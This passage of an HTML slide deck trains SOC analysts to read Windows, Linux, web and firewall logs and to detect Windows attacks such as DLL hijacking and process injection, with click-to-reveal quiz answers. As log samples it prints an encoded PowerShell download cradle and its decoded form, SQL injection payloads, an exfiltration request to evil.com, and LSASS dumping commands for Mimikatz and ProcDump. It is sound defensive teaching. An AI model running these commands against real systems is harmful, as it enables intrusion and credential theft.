+08:15:00  PID: 4520  C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE<br>
+08:15:02  PID: 4528  ParentPID: 4520  C:\Windows\System32\cmd.exe<br>
+             Command: cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AYgBlAGEAYwBvAG4AJwApAA==<br><br>
+08:15:03  PID: 4532  ParentPID: 4528  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br>
+08:15:05  PID: 4532  (powershell.exe) made DNS query to: 192.168.1.2<br>
+08:15:07  PID: 4540  ParentPID: 4532  C:\Windows\System32\rundll32.exe
+    </span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Analyze this attack chain. Click to reveal each answer:</p>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. What was the initial infection vector?
+    <div class="quiz-answer"><strong>Phishing</strong> — WINWORD.EXE (Word) spawned cmd.exe. User opened a malicious document.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. What does the encoded PowerShell do?
+    <div class="quiz-answer"><code>IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/beacon')</code> — It downloads and runs a C2 payload from 192.168.1.2.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. What would you do next?
+    <div class="quiz-answer">Isolate the host immediately. The process tree shows a classic phishing → macro → PowerShell → C2 attack chain. Block 192.168.1.2 at the firewall.</div>
+  </div>
+</div>
+
+<!-- SLIDE 18: POWERSHELL LOGGING -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>PowerShell Logging</h2><span class="slide-num">PS LOGS</span></div>
+  <p>PowerShell is the most abused tool in Windows attacks. Enable <strong>Script Block Logging</strong> (Event ID 4104) and <strong>Module Logging</strong> to catch attackers.</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># PowerShell Event ID 4104 — Script Block Logging</span><br>
+    <span style="color:#64748b;">
+PowerShell is registering script block:<br>
+IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/beacon')<br><br>
+ScriptBlock ID: abc123<br>
+Path: C:\Users\victim\AppData\Local\Temp\__PSScriptPolicy_test_xyz.ps1
+    </span>
+  </div>
+  <div class="terminal" style="margin-top:8px;font-size:13px;">
+    <span class="comment"># PowerShell Event ID 4103 — Module Logging (pipeline)</span><br>
+    <span style="color:#64748b;">
+Command: Invoke-Expression<br>
+Detail: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/beacon')<br>
+User: DESKTOP-7F3A\victim
+    </span>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">Even if attackers use -EncodedCommand, the decoded script appears in Event ID 4104. Always check PowerShell logs in an incident.</p>
+</div>
+
+
+<!-- SLIDE 20: PART HEADER — LINUX LOGS -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="grid-2">
+    <div>
+      <span class="badge badge-linux">PART 2</span>
+      <h1 style="color:var(--accent2);-webkit-text-fill-color:var(--accent2);">Linux Logs</h1>
+      <p>auth.log, syslog, journalctl &amp; auditd</p>
+      <p><em>Slides 21 — 22</em></p>
+    </div>
+    <div style="font-size:180px;text-align:center;color:var(--accent2);">
+      <i class="fa-brands fa-linux"></i>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 21: LINUX LOGGING -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Linux Logging Essentials</h2><span class="slide-num">LINUX</span></div>
+  <p>Every authentication, command, and system event is logged somewhere on Linux. Know where to look.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>File</th><th>Contents</th><th>SOC Use</th></tr>
+    <tr><td><code>/var/log/auth.log</code></td><td>All auth events (logins, sudo)</td><td>SSH brute force, privilege escalation</td></tr>
+    <tr><td><code>/var/log/syslog</code></td><td>General system messages</td><td>Service failures, kernel messages</td></tr>
+    <tr><td><code>/var/log/kern.log</code></td><td>Kernel messages</td><td>Driver exploits, kernel panics</td></tr>
+    <tr><td><code>/var/log/nginx/access.log</code></td><td>Web server requests</td><td>Web attacks, scanning</td></tr>
+    <tr><td><code>journalctl</code></td><td>systemd journal (central)</td><td>Query all logs with structured filters</td></tr>
+  </table>
+  <div class="terminal">
+    <span class="comment"># Real-time SSH monitoring</span><br>
+    <span class="cmd">$ tail -f /var/log/auth.log | grep "Failed password"</span><br><br>
+    <span class="comment"># Look up a specific user's sudo usage</span><br>
+    <span class="cmd">$ journalctl _UID=$(id -u jdoe) | grep sudo</span>
+  </div>
+</div>
+
+<!-- SLIDE 22: 🔍 INVESTIGATION — SSH ATTACK -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>🔍 Investigation: SSH Breach</h2><span class="slide-num">HANDS ON</span></div>
+  <p>A web server is behaving strangely. You check the auth.log and find this:</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># /var/log/auth.log — recent entries</span><br>
+    <span style="color:#64748b;">
+Jul 06 02:00:01 sshd[1234]: Failed password for root from 45.33.32.156 port 48231 ssh2<br>
+Jul 06 02:00:05 sshd[1234]: Failed password for root from 45.33.32.156 port 48232 ssh2<br>
+Jul 06 02:00:09 sshd[1234]: Failed password for root from 45.33.32.156 port 48233 ssh2<br>
+... (150 more failures for root, admin, test, ubuntu) ...<br>
+Jul 06 02:32:17 sshd[1234]: Failed password for webadmin from 45.33.32.156 port 49123 ssh2<br>
+Jul 06 02:32:19 sshd[1234]: Accepted password for webadmin from 45.33.32.156 port 49124 ssh2<br>
+Jul 06 02:32:20 sshd[1234]: Received disconnect from 45.33.32.156<br>
+Jul 06 02:35:00 sshd[1234]: Failed password for root from 10.0.0.50 port 38421 ssh2<br>
+Jul 06 02:35:05 sshd[1234]: Accepted password for root from 10.0.0.50 port 38422 ssh2
+    </span>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. What happened at 02:32?
+    <div class="quiz-answer"><strong>Attacker brute-forced SSH from 45.33.32.156</strong>, guessed the password for webadmin, logged in briefly, then disconnected at 02:32:20.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. What's suspicious about the 02:35 event?
+    <div class="quiz-answer"><strong>Root login from internal IP 10.0.0.50.</strong> Was that the attacker moving laterally after compromising webadmin? Check if 10.0.0.50 is a known admin workstation.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. How do you count how many failed attempts came from 45.33.32.156?
+    <div class="quiz-answer"><code>grep "45.33.32.156" /var/log/auth.log | grep "Failed password" | wc -l</code></div>
+  </div>
+</div>
+
+<!-- SLIDE 23: PART HEADER — WEB & NETWORK LOGS -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="grid-2">
+    <div>
+      <span class="badge badge-net">PART 3</span>
+      <h1 style="color:var(--green);-webkit-text-fill-color:var(--green);">Web &amp; Network Logs</h1>
+      <p>Apache, Nginx, Firewalls &amp; Proxy Logs</p>
+      <p><em>Slides 24 — 27</em></p>
+    </div>
+    <div style="font-size:180px;text-align:center;color:var(--green);">
+      <i class="fa-solid fa-globe"></i>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 24: WEB SERVER LOGS -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Web Server Logs</h2><span class="slide-num">WEB</span></div>
+  <p>Apache and Nginx logs record every HTTP request. You can spot attacks, scanners, and data exfiltration.</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Combined Log Format — Apache/Nginx default</span><br>
+    <span style="color:#64748b;">
+        <span class="hl">IP</span>          <span class="hl"> -  user</span>  <span class="hl">   timestamp   </span>  <span class="hl">  method  path</span>       <span class="hl">status  size</span>  <span class="hl">referrer</span>       <span class="hl">user-agent</span><br>
+192.168.1.5 - - [06/Jul/2026:10:15:23 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"<br>
+203.0.113.5 - - [06/Jul/2026:10:15:25 +0000] "GET /admin HTTP/1.1" 403 234 "-" "python-requests/2.28"<br>
+203.0.113.5 - - [06/Jul/2026:10:15:26 +0000] "GET /admin/login.php HTTP/1.1" 200 4567 "-" "python-requests/2.28"<br>
+203.0.113.5 - - [06/Jul/2026:10:15:27 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "http://target.com/admin/login.php" "python-requests/2.28"
+    </span>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">What's suspicious? A python script scanning /admin paths (403 → 200 → 302 = found the login page and submitted credentials).</p>
+</div>
+
+<!-- SLIDE 25: 🔍 INVESTIGATION — FIND THE WEB ATTACK -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>🔍 Investigation: SQLi Detection</h2><span class="slide-num">HANDS ON</span></div>
+  <p>Your IDS alerts on SQL injection. You pull the web access log to confirm:</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># /var/log/nginx/access.log — suspicious requests</span><br>
+    <span style="color:#64748b;">
+10:00:01  10.0.0.99  GET /products?id=1  HTTP/1.1  200<br>
+10:00:02  10.0.0.99  GET /products?id=1%27  HTTP/1.1  200<br>
+10:00:03  10.0.0.99  GET /products?id=1%27%20OR%20%271%27%3D%271  HTTP/1.1  200<br>
+10:00:04  10.0.0.99  GET /products?id=1%27%20UNION%20SELECT%201%2C2%2C3%2C4--  HTTP/1.1  200<br>
+10:00:05  10.0.0.99  GET /products?id=1%27%20UNION%20SELECT%201%2Ctable_name%2C3%2C4%20FROM%20information_schema.tables--  HTTP/1.1  200
+    </span>
+  </div>
+  <p>Decode the URL-encoded payloads in your head:</p>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. What is the attacker testing at 10:00:02?
+    <div class="quiz-answer"><code>id=1'</code> — Testing if the parameter is vulnerable to SQL injection by adding a single quote. If it errors, they know it's injectable.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. What payload is at 10:00:03?
+    <div class="quiz-answer"><code>id=1' OR '1'='1</code> — Classic SQLi bypass. If this returns all products, the parameter is vulnerable.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. What is the attacker doing at 10:00:04-05?
+    <div class="quiz-answer"><strong>Union-based SQL injection</strong> — They're probing the number of columns (1,2,3,4) and extracting table names from information_schema. This is data exfiltration.</div>
+  </div>
+</div>
+
+<!-- SLIDE 26: FIREWALL & PROXY LOGS -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Firewall &amp; Proxy Logs</h2><span class="slide-num">NETWORK</span></div>
+  <p>Firewalls log allowed and denied connections. Proxies log every web request. Together, they tell the story of network communication.</p>
+  <div class="grid-2">
+    <div class="terminal" style="font-size:13px;">
+      <span class="comment"># Firewall deny log</span><br>
+      <span style="color:#64748b;">
+10:00:00  DENY  TCP  203.0.113.5:44321  → 10.0.0.5:445<br>
+10:00:01  DENY  TCP  203.0.113.5:44322  → 10.0.0.5:445<br>
+10:00:02  DENY  TCP  203.0.113.5:44323  → 10.0.0.5:3389<br>
+10:00:03  ALLOW TCP  203.0.113.5:44324  → 10.0.0.5:443
+      </span>
+    </div>
+    <div class="terminal" style="font-size:13px;">
+      <span class="comment"># Proxy log — what happened after</span><br>
+      <span style="color:#64748b;">
+10:00:04  203.0.113.5  GET  http://192.168.1.2/beacon  <span class="hl">200</span><br>
+10:00:05  10.0.0.5     POST https://evil.com/exfil    <span class="hl">200</span>
+      </span>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">External IP probes SMB (445) and RDP (3389) — blocked. Then connects on HTTPS (443) — allowed. Minutes later, internal host phones home to evil.com. <strong>Correlation reveals the breach.</strong></p>
+</div>
+
+<!-- SLIDE 27: 🔍 INVESTIGATION — CORRELATE ACROSS LOGS -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>🔍 Investigation: Full Correlation</h2><span class="slide-num">HANDS ON</span></div>
+  <p>You have three log sources. Piece together what happened:</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># Source A: Firewall</span><br>
+    <span style="color:#64748b;">
+14:00:00  ALLOW TCP  10.0.0.10:49123 → 10.0.0.5:22<br>
+14:00:05  ALLOW TCP  10.0.0.5:22 → 10.0.0.10:49123<br>
+14:05:00  ALLOW TCP  10.0.0.5:38451 → 192.168.1.2:443
+    </span><br><br>
+    <span class="comment"># Source B: Linux auth.log on 10.0.0.5</span><br>
+    <span style="color:#64748b;">
+14:00:01  sshd[2345]: Accepted password for root from 10.0.0.10<br>
+14:00:06  sshd[2345]: Received disconnect from 10.0.0.10
+    </span><br><br>
+    <span class="comment"># Source C: Proxy log</span><br>
+    <span style="color:#64748b;">
+14:05:01  10.0.0.5  GET  https://192.168.1.2/exfil  <span class="hl">200</span>  size: 1.2MB
+    </span>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    Click for the full analysis
+    <div class="quiz-answer">
+      <strong>Timeline:</strong><br>
+      14:00:00 — Attacker from 10.0.0.10 initiates SSH to 10.0.0.5 (pivot host)<br>
+      14:00:01 — Attacker logs in as <strong>root</strong> on 10.0.0.5 (compromised credentials)<br>
+      14:00:06 — SSH session ends after 5 seconds<br>
+      14:05:00 — 10.0.0.5 connects to 192.168.1.2:443 (C2 server)<br>
+      14:05:01 — <strong>1.2MB of data exfiltrated</strong> to the C2 server<br><br>
+      <strong>Conclusion:</strong> Attacker SSH'd in as root, deployed a C2 agent, and exfiltrated 1.2MB of data. The initial compromise was likely via SSH credential theft or brute force on 10.0.0.10.
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 28: LOG ANALYSIS CHALLENGE -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Log Analysis Challenge</h2><span class="slide-num">QUIZ</span></div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. Which Windows Event ID indicates a failed logon?
+    <div class="quiz-answer"><strong>4625</strong></div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. Sysmon Event ID 8 detects what?
+    <div class="quiz-answer"><strong>CreateRemoteThread</strong> — a common process injection technique.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. Where does Linux store SSH authentication logs?
+    <div class="quiz-answer"><code>/var/log/auth.log</code></div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    4. What URL-encoded SQLi payload is <code>1%27%20OR%20%271%27%3D%271</code>?
+    <div class="quiz-answer"><code>1' OR '1'='1</code> — classic SQL injection bypass.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    5. WinWord.exe spawning powershell.exe is an example of what attack chain?
+    <div class="quiz-answer"><strong>Phishing → Macro → PowerShell download cradle.</strong> One of the most common initial access vectors.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    6. What command watches auth.log for failed passwords in real-time?
+    <div class="quiz-answer"><code>tail -f /var/log/auth.log | grep "Failed password"</code></div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    7. HTTP status 403 tells you what?
+    <div class="quiz-answer"><strong>Forbidden</strong> — access denied. Attackers see this when probing restricted paths like /admin.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    8. PowerShell Event ID 4104 captures what?
+    <div class="quiz-answer"><strong>Script Block Logging</strong> — captures the full script content even if it was encoded.</div>
+  </div>
+</div>
+
+<!-- SLIDE 29: M02 SUMMARY -->
+<div class="slide" data-module="Module 02: Logs">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 02 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You can now:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">Read Security log events (4624, 4625, 4672)</div>
+      <div class="card">Trace attack chains using Sysmon Event ID 1</div>
+      <div class="card">Decode Base64 PowerShell payloads</div>
+      <div class="card">Investigate SSH brute force from auth.log</div>
+      <div class="card">Detect SQL injection in web access logs</div>
+      <div class="card">Correlate firewall, auth, and proxy logs</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Before Module 03 (Windows Internals):</p>
+      <p style="font-size:14px;color:var(--muted);">Set up Sysmon on your lab machine. Generate events — open files, run commands, visit websites. Read every log entry.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+</div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 03: WINDOWS INTERNALS — 10 slides (34-43)                                    -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 34: M03 INTRO -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 03</div>
+    <h1>Windows Internals<br>for Defenders</h1>
+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">Process architecture, svchost hunting, LSASS protection, DLL hijacking, process injection, and Sysinternals tools — what every SOC analyst needs to know about Windows under the hood.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-gears fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-shield-halved fa-3x" style="margin:0 12px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-microchip fa-3x" style="margin:0 12px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">10 slides — press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 35: PROCESSES & SVCHOST -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>Processes &amp; svchost.exe</h2><span class="slide-num">CORE</span></div>
+  <p>Every Windows process has an <strong>EPROCESS</strong> (kernel tracking block), a <strong>PEB</strong> (user-mode structure with DLL list, command line), and a <strong>TEB per thread</strong>. Attackers manipulate these to hide code.</p>
+  <p style="margin-top:8px;font-weight:600;color:var(--yellow);">The #1 process to know: <code>svchost.exe</code> (Service Host)</p>
+  <table class="tbl" style="margin-top:8px;">
+    <tr><th></th><th>Legitimate</th><th>Malicious</th></tr>
+    <tr><td><strong>Path</strong></td><td><code>C:\Windows\System32\</code></td><td><code>C:\Users\...\</code>, <code>C:\Temp\</code></td></tr>
+    <tr><td><strong>Parent</strong></td><td><code>services.exe</code></td><td><code>explorer.exe</code>, <code>cmd.exe</code></td></tr>
+    <tr><td><strong>Command</strong></td><td><code>-k netsvcs</code> (has group flag)</td><td>No <code>-k</code> flag or unusual group</td></tr>
+    <tr><td><strong>User</strong></td><td><code>LOCAL SERVICE</code> / <code>NETWORK SERVICE</code></td><td>User account (<code>DESKTOP-7F3A\victim</code>)</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;">Check these four fields in Sysmon EID 1 or Process Explorer. If any doesn't match the legit pattern, treat it as malicious until proven otherwise.</p>
+</div>
+
+<!-- SLIDE 36: Using Task Manager -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>Using Task Manager</h2><span class="slide-num">BASIC</span></div>
+  <p>Task Manager gives you a quick view of running processes. Press <strong>Ctrl+Shift+Esc</strong> to open it. It's the first tool you reach for during triage.</p>
+  <p style="margin-top:8px;font-weight:600;">What to check when investigating:</p>
+  <ul style="margin-top:6px;font-size:16px;color:var(--muted);">
+    <li><strong>Processes tab</strong> — look for unfamiliar process names, high CPU/memory usage, or processes running under unusual usernames (e.g., svchost.exe running as <code>.\victim</code> instead of <code>LOCAL SERVICE</code>)</li>
+    <li><strong>Startup tab</strong> — see what runs at boot. Disable anything suspicious</li>
+    <li><strong>Details tab</strong> — right-click columns → add <strong>Command Line</strong> and <strong>Parent Process</strong>. This turns Task Manager into a mini-Process Explorer. Check if svchost.exe has <code>-k</code> flag and if parent is services.exe</li>
+    <li>Right-click any process → <strong>Search online</strong> to quickly check if it's known malware</li>
+  </ul>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Limitation: Task Manager doesn't show loaded DLLs or handles. When you need that detail, switch to Process Explorer.</p>
+</div>
+
+<!-- SLIDE 37: LSASS & CREDENTIAL THEFT -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>LSASS: The Crown Jewel</h2><span class="slide-num">ATTACK</span></div>
+  <p><strong>LSASS</strong> handles all authentication — every password hash, Kerberos ticket, and plaintext credential passes through its memory. This makes it the #1 target after initial compromise.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:12px;">
+    <div class="card" style="text-align:center;">
+      <div style="font-size:28px;color:var(--red);"><i class="fa-solid fa-skull"></i></div>
+      <p style="font-size:14px;margin-top:4px;"><strong>Mimikatz</strong><br><code>sekurlsa::logonpasswords</code></p>
+    </div>
+    <div class="card" style="text-align:center;">
+      <div style="font-size:28px;color:var(--red);"><i class="fa-solid fa-file-export"></i></div>
+      <p style="font-size:14px;margin-top:4px;"><strong>ProcDump</strong><br><code>procdump.exe -ma lsass.exe</code></p>
+    </div>
+    <div class="card" style="text-align:center;">
+      <div style="font-size:28px;color:var(--red);"><i class="fa-solid fa-user-secret"></i></div>
+      <p style="font-size:14px;margin-top:4px;"><strong>DCSync</strong><br><code>lsadump::dcsync</code></p>
+    </div>
+  </div>
+  <p style="margin-top:10px;"><strong>Detection in Sysmon:</strong> EID 1 where <code>Image contains procdump</code> <em>and</em> <code>CommandLine contains lsass.exe</code>. Also EID 11 (FileCreate) for <code>*.dmp</code> files. If you see this — <strong>isolate the host immediately</strong>, every credential on that machine is compromised.</p>
+  <p style="margin-top:6px;font-size:14px;color:var(--yellow);">Modern Windows runs LSASS as PPL (Protected Process Light), which blocks direct memory reads. Attackers bypass it with kernel drivers or by running as SYSTEM.</p>
+</div>
+
+<!-- SLIDE 38: DLL HIJACKING -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>DLL Search Order Hijacking</h2><span class="slide-num">ATTACK</span></div>
+  <p>When an app loads a DLL, Windows searches in order: <strong>app's directory → System32 → System → CWD → PATH</strong>. If a DLL isn't in System32, the app's own directory is checked first. Drop a malicious DLL there with the right name → the app loads your code.</p>
+  <div class="grid-2" style="margin-top:8px;">
+    <div class="terminal" style="font-size:12px;">
+      <span class="comment"># Legit app loading a missing DLL</span><br>
+      <span style="color:#64748b;">
+App dir:   C:\Program Files\App\app.exe<br>
+           looks for helper.dll → NOT FOUND<br>
+System32:  helper.dll → NOT FOUND<br>
+           <span class="hl">App dir: helper.dll</span> → FOUND! (attacker placed it)
+      </span>
+    </div>
+    <div class="terminal" style="font-size:12px;">
+      <span class="comment"># Detection in Sysmon EID 7</span><br>
+      <span style="color:#64748b;">
+ImageLoaded: <span class="hl">C:\Program Files\App\helper.dll</span><br>
+Image:       C:\Program Files\App\app.exe<br><br>
+Check: Is this DLL signed?<br>
+Does it belong in this path?
+      </span>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">Query Sysmon EID 7 for DLLs loaded from non-<code>C:\Windows\</code> paths. Cross-reference with a baseline of known-good DLL locations.</p>
+</div>
+
+<!-- SLIDE 39: PROCESS INJECTION -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>Process Injection Techniques</h2><span class="slide-num">ATTACK</span></div>
+  <p>Running malicious code inside a legitimate process to evade detection. Three main types:</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:12px;">
+    <div class="card" style="border-left:3px solid var(--accent);">
+      <p style="font-size:15px;font-weight:600;">DLL Injection</p>
+      <p style="font-size:13px;"><code>CreateRemoteThread</code> + <code>LoadLibrary</code> — injects a DLL into the target process.<br><strong>Detection:</strong> Sysmon <strong>EID 8</strong> (CreateRemoteThread).</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--accent2);">
+      <p style="font-size:15px;font-weight:600;">APC Injection</p>
+      <p style="font-size:13px;">Queues code to an <strong>existing thread</strong>. No new thread = stealthier.<br><strong>Detection:</strong> ETW Threat Intelligence EID 12. Hard to detect with Sysmon alone.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">Process Hollowing</p>
+      <p style="font-size:13px;">Spawns a legit process (suspended), unmaps its code, replaces with malware.<br><strong>Detection:</strong> Check memory regions in Process Explorer — hollowed processes show <strong>no loaded image</strong>.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 40: CREATEREMOTETHREAD DETECTION -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>Detecting DLL Injection</h2><span class="slide-num">DETECTION</span></div>
+  <p>Sysmon EID 8 is your strongest signal. Here's what it looks like in practice:</p>
+  <div class="grid-2" style="margin-top:8px;">
+    <div class="terminal" style="font-size:12px;">
+      <span class="comment"># Sysmon EID 8 — remote thread created</span><br>
+      <span style="color:#64748b;">
+SourcePID:   4520 (malware.exe)<br>
+TargetPID:   3488 (explorer.exe)<br>
+StartAddr:   0x7FFE...<br>
+StartModule: kernel32.dll<br><br>
+<span class="hl">Source != Target = injection</span>
+      </span>
+    </div>
+    <div class="terminal" style="font-size:12px;">
+      <span class="comment"># Sysmon EID 1 — the injector's origin</span><br>
+      <span style="color:#64748b;">
+Image: C:\Users\victim\AppData\Local\Temp\mal.exe<br>
+ParentImage: OUTLOOK.EXE<br><br>
+<span class="hl">Temp dir + EID 8 = confirmed</span>
+      </span>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">EID 8 + EID 1 from Temp/Local/AppData = process injection. Isolate the host and preserve memory for forensic analysis.</p>
+</div>
+
+<!-- SLIDE 41: PROCESS HOLLOWING -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div class="slide-header"><h2>Process Hollowing</h2><span class="slide-num">DETECTION</span></div>
+  <p>The attacker spawns a legitimate process suspended, unmaps its code, writes malicious code, and resumes it. The process name looks completely legit — but its memory is attacker-controlled.</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># How hollowing works (conceptual)</span><br>
+    <span style="color:#64748b;">
+1. CreateProcess("notepad.exe", CREATE_SUSPENDED)   → legit notepad.exe, PID 4520<br>
+2. NtUnmapViewOfSection(hProcess, baseAddr)         ⟵ rip out notepad's code<br>
+3. VirtualAllocEx + WriteProcessMemory(hProcess)     ⟵ write malware in its place<br>
+4. SetThreadContext + ResumeThread(hProcess)         ⟵ "notepad.exe" runs attacker code
+    </span>
+  </div>
+  <p style="margin-top:8px;"><strong>How to detect it:</strong> In Process Explorer, right-click the process → Properties → <strong>Image tab</strong>. If the process says "Unable to load image" or shows no loaded modules, it's likely hollowed. Also check Sysmon EID 1 — a hollowed process will have an unusual parent (e.g., notepad.exe spawned by cmd.exe).</p>
+</div>
+
+<!-- SLIDE 42: M03 SUMMARY -->
+<div class="slide" data-module="Module 03: Windows Internals">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 03 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You can now:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">Spot rogue svchost.exe by path, parent, and flags</div>
+      <div class="card">Detect LSASS dump via Sysmon EID 1 + 11</div>
+      <div class="card">Understand DLL hijacking and EID 7 detection</div>
+      <div class="card">Identify 3 injection types and their Sysmon signals</div>
+      <div class="card">Use Task Manager for quick process triage</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Before Module 04 (Threat Landscape):</p>
+      <p style="font-size:14px;color:var(--muted);">Spend 15 minutes in Process Explorer looking at every svchost.exe on your system. Check their parents, services, and paths.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+</div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 04: THREAT LANDSCAPE — 12 slides (43-54)                                    -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 43: M04 INTRO -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 04</div>
+    <h1>Understanding the<br>Threat Landscape</h1>
